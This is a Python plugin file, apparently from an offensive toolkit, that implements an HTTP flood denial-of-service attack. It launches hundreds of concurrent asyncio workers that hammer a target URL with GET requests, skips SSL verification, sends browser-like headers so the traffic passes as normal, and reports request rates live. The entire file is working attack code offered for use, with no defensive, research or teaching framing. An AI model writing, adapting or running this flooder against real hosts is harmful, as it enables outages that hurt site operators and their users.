from plugins.common import *
import asyncio
import aiohttp
import time

def httpflood(host, threads=500):
    try:
        if host.startswith('https://'):
            host = host
        elif host.startswith('http://'):
            host = host
        else:
            host = f'http://{host}'

        # strip trailing slash
        host = host.rstrip('/')

        threads = int(threads)
        count = [0]
        errors = [0]

        logging.info(f'Starting HTTP flood -> {host} | {threads} coroutines | Ctrl+C to stop')

        async def worker(session, stop):
            while not stop.is_set():
                try:
                    async with session.get(
                        host,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False
                    ) as resp:
                        await resp.read()
                        count[0] += 1
                except:
                    errors[0] += 1

        async def main():
            stop = asyncio.Event()

            connector = aiohttp.TCPConnector(
                limit=threads,
                ssl=False,
                enable_cleanup_closed=True
            )

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
            }

            async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
                tasks = [asyncio.create_task(worker(session, stop)) for _ in range(threads)]

                async def stats():
                    prev = 0
                    while not stop.is_set():
                        await asyncio.sleep(1)
                        diff = count[0] - prev
                        prev = count[0]
                        logging.info(f'Requests: {count[0]} | {diff} req/s | Errors: {errors[0]}')

                tasks.append(asyncio.create_task(stats()))

                try:
                    await asyncio.gather(*tasks)
                except asyncio.CancelledError:
                    stop.set()

        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            logging.success(f'Stopped | Total requests: {count[0]} | Errors: {errors[0]}')

    except Exception as e:
        logging.error(e)